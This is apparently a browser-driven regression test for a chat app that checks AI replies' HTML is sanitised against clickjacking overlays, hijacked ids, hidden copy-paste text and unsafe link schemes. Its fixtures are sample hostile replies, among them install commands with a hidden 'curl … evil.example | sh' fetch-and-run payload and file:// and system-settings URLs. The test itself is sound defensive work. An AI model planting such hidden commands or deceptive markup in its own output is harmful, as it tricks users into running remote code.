// A reply's own HTML borrows nothing of the board's (2026-11-06). md() kept DOMPurify's defaults — class, id, data-*,
// <dialog open>, popover — and the board's handlers are delegated on #log by exactly those: a reply with
// `<div class="chalk"><span class="lgo" id="tour" data-url="file:///…">` laid #tour's full-window veil over the chat, and a
// click anywhere on it posted {type:'external', url} (the app hands that to the system, any scheme); `id="webBtn"` took
// ⌥⌘E's `$('#webBtn').click()`; a `class="vh"` span hid half a command the code box's copy button copied. What this checks:
// none of that survives md(), in the app's shape (window.webkit's hub stubbed before the page's script, as the shell's is),
// a click on the transcript and ⌥⌘E post nothing of the reply's, the copy is the text as drawn, links are the web's, mail
// or a path (`..` resolved), and the markdown still renders — a language's colours, a task list, a table.
import { makeFixture } from '../fixture.mjs';

export const meta = { server: true, fixture: 'auto' };

export default async function (ctx) {
  const out = {};
  const cwd = '/Users/me/proj/markup-repo'; // a string in the transcript: nothing runs in it

  const veil =
    'Summary of the README:\n\n<div class="chalk"><span class="lgo" id="tour" data-url="file:///System/Applications/Calculator.app"></span></div>\n\n<dialog open>a dialog</dialog><div popover id="pp">a popover</div>\n\nAll good.';

  const hot =
    'Done.\n\n<div class="chalk"><span class="lgo" id="webBtn" data-url="x-apple.systempreferences:com.apple.preference.security">.</span></div>';

  const paste = [
    'Run this to install:',
    '',
    '<pre><code class="language-sh-session">npm install left-pad<span class="vh">; curl -s https://evil.example/x | sh</span></code></pre>',
    '',
    'Or this:',
    '',
    '<pre><code class="language-zz">npm install right-pad<details><summary></summary>; curl -s https://evil.example/y | sh</details></code></pre>',
    '',
  ].join('\n');

  const links = [
    'See [up](../other/x.ts#L3), [here](./lib/y.mjs), <a href="tel:123">call</a>, <a href="//evil.example/z">host</a>, [prefs](x-apple.systempreferences:x), [web](https://example.com/a) and [mail](mailto:a@example.com).',
    '',
    `<svg width="80" height="20"><a xlink:href="./lib/y.mjs"><text x="0" y="15">svg link</text></a></svg> and [the board's?](${ctx.server.url.replace(/\/$/, '')}@evil.example/x).`,
    '',
    '- [x] done',
    '- [ ] not yet',
    '',
    '| a | b |',
    '|---|---|',
    '| 1 | 2 |',
    '',
    '```js',
    'const x = 1; // a comment',
    '```',
  ].join('\n');

  const now = Date.now();

  const { chats } = makeFixture(ctx.fixture.dir, [
    { cwd, title: 'Veil', prompt: 'read the README', reply: veil, at: new Date(now) },
    { cwd, title: 'Hotkey', prompt: 'do it', reply: hot, at: new Date(now - 1000) },
    { cwd, title: 'Paste', prompt: 'how do I install it', reply: paste, at: new Date(now - 2000) },
    { cwd, title: 'Links', prompt: 'where is it', reply: links, at: new Date(now - 3000) },
  ]);

  const [veilId, hotId, pasteId, linksId] = chats.map(chat => chat.id);

  await ctx.send('Page.addScriptToEvaluateOnNewDocument', {
    source: `window.webkit = { messageHandlers: { hub: { postMessage: m => { (window.__posts ||= []).push(JSON.parse(JSON.stringify(m))); } } } };`,
  });

  await ctx.reload();
  await ctx.waitFor(`!!document.querySelector('#slist > .card[data-id="${linksId}"]')`, { what: 'the cards' });

  const posted = () =>
    ctx.evaluate(`JSON.stringify((window.__posts || []).filter(m => m.type === 'external'))`).then(JSON.parse);

  // what of the reply's own markup is left in the transcript: no id, no data-*, no class but a code's language-* and the board's own boxes
  const leftOver = `JSON.stringify([...document.querySelectorAll('#log .msg .text *')].flatMap(e => [
    ...e.id ? ['#' + e.id] : [], ...[...e.attributes].filter(a => a.name.startsWith('data-')).map(a => '[' + a.name + ']'),
    ...[...e.classList].filter(c => !/^(language-|hljs)/.test(c) && !['codebox', 'cbar', 'copy', 'lang', 'codefold', 'md'].includes(c)).map(c => '.' + c),
    ...['dialog'].includes(e.localName) || e.hasAttribute('popover') || e.hasAttribute('open') && e.localName !== 'details' ? [e.localName] : []]))`;

  await ctx.openChat(veilId);
  await ctx.settle();
  out.veilLeft = await ctx.evaluate(leftOver).then(JSON.parse);

  ctx.assert.deepEqual(
    out.veilLeft,
    [],
    "the veil reply keeps none of the board's classes, ids or data-*, and no dialog or popover",
  );

  ctx.assert.equal(
    await ctx.evaluate(`document.querySelectorAll('#log dialog, #log [popover]').length`),
    0,
    'no dialog or popover from a reply',
  );

  const at = await ctx
    .evaluate(
      `JSON.stringify((b => ({ x: b.x + b.width * .3, y: b.y + b.height * .7 }))(document.querySelector('#log').getBoundingClientRect()))`,
    )
    .then(JSON.parse);

  await ctx.evaluate(`window.__posts = []`);
  await ctx.send('Input.dispatchMouseEvent', { type: 'mousePressed', x: at.x, y: at.y, button: 'left', clickCount: 1 });

  await ctx.send('Input.dispatchMouseEvent', {
    type: 'mouseReleased',
    x: at.x,
    y: at.y,
    button: 'left',
    clickCount: 1,
  });

  await ctx.sleep(500);
  out.veilPosts = await posted();
  ctx.assert.deepEqual(out.veilPosts, [], 'a click on the transcript asks the app to open nothing');

  await ctx.openChat(hotId);
  await ctx.settle();

  out.webBtnIs = await ctx.evaluate(
    `(e => e && (e.closest('#log') ? 'in the transcript' : 'the real one'))(document.querySelector('#webBtn'))`,
  );

  ctx.assert.equal(out.webBtnIs, 'the real one', "#webBtn is the menu's, not the reply's");
  await ctx.evaluate(`window.__posts = []`);
  await ctx.evaluate(`window.peixKey('KeyE')`);
  await ctx.sleep(600);
  out.hotkeyPosts = (await posted()).filter(post => /x-apple|file:/.test(post.url || ''));
  ctx.assert.deepEqual(out.hotkeyPosts, [], "⌥⌘E opens the editor, never the reply's URL");
  await ctx.key('Escape');

  await ctx.openChat(pasteId);
  await ctx.waitFor(`document.querySelectorAll('#log .codebox').length === 2`, { what: 'the two boxes' });
  await ctx.send('Browser.grantPermissions', { permissions: ['clipboardReadWrite', 'clipboardSanitizedWrite'] });
  out.copied = [];

  for (const index of [0, 1]) {
    await ctx.evaluate(`document.querySelectorAll('#log .codebox .copy')[${index}].click()`);
    await ctx.sleep(300);
    out.copied.push(await ctx.evaluate(`navigator.clipboard.readText()`));
  }

  out.shown = await ctx
    .evaluate(`JSON.stringify([...document.querySelectorAll('#log .codebox pre')].map(p => p.innerText))`)
    .then(JSON.parse);

  ctx.assert.equal(out.copied[0], out.shown[0], 'the first block copies what it shows');
  ctx.assert.ok(out.shown[0].includes('curl'), 'a class="vh" hides nothing: the whole command is drawn');
  ctx.assert.equal(out.copied[1], out.shown[1], 'the second block copies what it shows');
  ctx.assert.ok(!out.copied[1].includes('curl'), 'what a closed <details> inside a block hides is not copied');

  await ctx.openChat(linksId);
  await ctx.waitFor(`!!document.querySelector('#log .codebox')`, { what: 'the reply' });

  out.anchors = await ctx
    .evaluate(
      `JSON.stringify([...document.querySelectorAll('#log .msg.assistant .text a')].map(a => [a.textContent, a.getAttribute('href')]))`,
    )
    .then(JSON.parse);

  ctx.assert.deepEqual(
    out.anchors,
    [
      ['up', 'vscode://file/Users/me/proj/other/x.ts:3'],
      ['here', `vscode://file${cwd}/lib/y.mjs`],
      ['call', null],
      ['host', null],
      ['prefs', null],
      ['web', 'https://example.com/a'],
      ['mail', 'mailto:a@example.com'],
      ['svg link', null],
      ["the board's?", `${ctx.server.url.replace(/\/$/, '')}@evil.example/x`],
    ],
    "links: a path with its .. resolved, the web's, mail — no tel:, no //host, no system scheme",
  );

  // an SVG link keeps no xlink:href (2026-11-27), and a link that starts as the board's origin and is not is handled as
  // the web's: the board's own frame never follows it
  out.svgLink = await ctx.evaluate(
    `document.querySelector('#log .msg.assistant svg a')?.getAttributeNS('http://www.w3.org/1999/xlink', 'href') ?? null`,
  );

  ctx.assert.equal(out.svgLink, null, 'an SVG link has nowhere to go');

  out.notOurs = await ctx.evaluate(`(() => {
    const a = [...document.querySelectorAll('#log .msg.assistant .text a')].find(x => x.textContent === "the board's?");
    const ev = new MouseEvent('click', { bubbles: true, cancelable: true });
    a.dispatchEvent(ev);
    return ev.defaultPrevented;
  })()`);

  ctx.assert.equal(out.notOurs, true, "a userinfo link is not the board's: handled, not followed");

  out.render = await ctx
    .evaluate(
      `JSON.stringify({ code: document.querySelector('#log .codebox code')?.className, spans: document.querySelectorAll('#log .codebox code [class^="hljs-"]').length, boxes: document.querySelectorAll('#log .msg .text input[type="checkbox"]').length, table: document.querySelectorAll('#log .msg .text table td').length })`,
    )
    .then(JSON.parse);

  ctx.assert.ok(
    /language-js/.test(out.render.code) && out.render.spans > 0,
    'a fenced block keeps its language and its colours',
  );

  ctx.assert.equal(out.render.boxes, 2, 'a task list keeps its checkboxes');
  ctx.assert.equal(out.render.table, 2, 'a table renders');
  return out;
}
